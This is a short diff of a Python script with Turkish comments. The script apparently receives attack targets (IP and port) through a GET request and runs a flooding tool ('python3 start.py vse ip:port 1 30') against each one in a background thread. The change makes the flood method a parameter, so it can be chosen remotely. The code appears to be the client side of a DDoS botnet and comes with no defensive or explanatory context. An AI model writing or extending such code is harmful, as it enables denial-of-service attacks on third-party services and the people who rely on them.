@@ -18,10 +18,10 @@ def load_config():
 # Konfigürasyonu yükle
 CONFIG = load_config()
 
-def execute_command(ip, port):
+def execute_command(ip, port, method):
     """Komutu çalıştıran fonksiyon"""
     try:
-        cmd_string = f"python3 start.py vse {ip}:{port} 1 30"
+        cmd_string = f"python3 start.py {method} {ip}:{port} 1 30"
         
         print(f"[*] Komut çalıştırılıyor: {cmd_string}")
         
@@ -66,7 +66,7 @@ def send_get_request():
                         
                         print(f"\n[*] Yeni hedef alındı - IP: {ip}, Port: {port}")
                         
-                        command_thread = Thread(target=execute_command, args=(ip, port))
+                        command_thread = Thread(target=execute_command, args=(ip, port, method))
                         command_thread.daemon = True
                         command_thread.start()
 
